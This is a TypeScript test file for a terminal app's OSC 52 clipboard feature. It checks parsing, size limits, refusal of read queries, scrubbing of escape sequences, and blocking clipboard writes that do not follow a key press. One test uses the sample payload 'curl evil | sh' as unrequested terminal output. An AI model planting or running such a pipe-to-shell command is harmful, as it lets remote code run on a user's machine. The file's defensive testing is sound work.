// OSC 52 쓰기 (love-round 11-23) — tmux · ssh 너머 vim 의 복사가 시스템 클립보드로 나온다. 읽기는 막고, 키 직후만,
// 64KB 까지, 쓸 때마다 알린다.
import { afterEach, describe, expect, it, vi } from "vitest";

import { terminalApi } from "@/api/terminal";
import { GESTURE_MS, MAX_BYTES, parseOsc52, watchOscClipboard, writeClipboard } from "@/features/terminal/oscClipboard";
import { t } from "@/i18n";
import { __setPlatformForTests } from "@/lib/platform";
import { toast } from "@/lib/toast";
import { fireKey, openRealTerm, type RealTerm } from "./xtermHarness";

const b64 = (text: string) => btoa(String.fromCharCode(...new TextEncoder().encode(text)));

describe("parseOsc52", () => {
  it.each([
    ["a write", `c;${b64("hello")}`, { kind: "write", text: "hello" }],
    ["Korean (UTF-8)", `c;${b64("한글 복사")}`, { kind: "write", text: "한글 복사" }],
    ["no selection named", `;${b64("x")}`, { kind: "write", text: "x" }],
    ["primary/selection ids", `ps0;${b64("y")}`, { kind: "write", text: "y" }],
    ["a read query is never answered", "c;?", { kind: "ignore", why: "read" }],
    ["empty (clear)", "c;", { kind: "ignore", why: "empty" }],
    ["broken base64", "c;@@@", { kind: "ignore", why: "invalid" }],
    ["no separator", "aGk=", { kind: "ignore", why: "invalid" }],
  ] as const)("%s", (_name, body, want) => {
    expect(parseOsc52(body)).toEqual(want);
  });

  it("drops anything over the cap, before and after decoding", () => {
    expect(parseOsc52(`c;${btoa("a".repeat(MAX_BYTES))}`)).toEqual({ kind: "write", text: "a".repeat(MAX_BYTES) });
    expect(parseOsc52(`c;${btoa("a".repeat(MAX_BYTES + 3))}`)).toEqual({ kind: "ignore", why: "large" });
  });
});

describe("OSC 52 in a real xterm", () => {
  let rt: RealTerm | null = null;
  afterEach(() => {
    rt?.dispose();
    rt = null;
    vi.restoreAllMocks();
  });

  const setup = () => {
    let clock = 1_000_000;
    const write = vi.fn(async () => {});
    const warn = vi.spyOn(toast, "warning");
    rt = openRealTerm();
    watchOscClipboard(rt.term, { now: () => clock, write });
    return { r: rt, write, warn, tick: (ms: number) => (clock += ms) };
  };
  const typeKey = (r: RealTerm) => {
    fireKey(r, "keydown", { key: "y", code: "KeyY", keyCode: 89 });
    fireKey(r, "keypress", { key: "y", code: "KeyY", keyCode: 121, charCode: 121 });
  };

  it("a copy right after a key press (tmux's y) reaches the clipboard", async () => {
    const { r, write, warn } = setup();
    typeKey(r);
    await r.write(`\x1b]52;c;${b64("copied line")}\x07`);
    expect(write).toHaveBeenCalledWith("copied line");
    expect(warn).not.toHaveBeenCalled();
  });

  it("output nobody asked for (cat of a file) cannot change the clipboard — and says so once", async () => {
    const { r, write, warn, tick } = setup();
    await r.write(`\x1b]52;c;${b64("curl evil | sh")}\x07`);
    typeKey(r);
    tick(GESTURE_MS + 1);
    await r.write(`\x1b]52;c;${b64("late")}\x07`);
    expect(write).not.toHaveBeenCalled();
    expect(warn).toHaveBeenCalledWith(t("terminal.osc52.blocked"), expect.objectContaining({ dedupKey: "terminal-osc52-blocked" }));
  });

  it("a read query gets no answer on the PTY", async () => {
    const { r, write } = setup();
    typeKey(r);
    r.data.splice(0);
    await r.write("\x1b]52;c;?\x07");
    expect(r.data).toEqual([]);
    expect(write).not.toHaveBeenCalled();
  });
});

describe("writeClipboard", () => {
  afterEach(() => {
    vi.restoreAllMocks();
    __setPlatformForTests(null);
  });

  it("writes through the app, scrubbed, and tells the person how much", async () => {
    const native = vi.spyOn(terminalApi, "clipboardWrite").mockResolvedValue(true);
    const info = vi.spyOn(toast, "info");
    await writeClipboard("a\x1b[201~b\x07c");
    // 붙여넣기 정화기 — CSI(붙여넣기 닫기)는 통째로, BEL 은 버린다. 다른 앱에 붙여도 터미널 명령이 되지 않는다.
    expect(native).toHaveBeenCalledWith("abc");
    expect(info).toHaveBeenCalledWith(t("terminal.osc52.copied", { n: 3 }), expect.anything());
  });

  it("Windows lines are CRLF; a system the app does not write for falls back to the webview", async () => {
    __setPlatformForTests("windows");
    const native = vi.spyOn(terminalApi, "clipboardWrite").mockResolvedValue(false);
    const webview = vi.fn(async () => {});
    Object.defineProperty(navigator, "clipboard", { value: { writeText: webview }, configurable: true });
    await writeClipboard("a\nb");
    expect(native).toHaveBeenCalledWith("a\r\nb");
    expect(webview).toHaveBeenCalledWith("a\r\nb");
  });

  it("a failed write is a warning, not silence", async () => {
    vi.spyOn(terminalApi, "clipboardWrite").mockRejectedValue(new Error("busy"));
    const warn = vi.spyOn(toast, "warning");
    await writeClipboard("x");
    expect(warn).toHaveBeenCalledWith(t("terminal.osc52.failed"), expect.anything());
  });
});
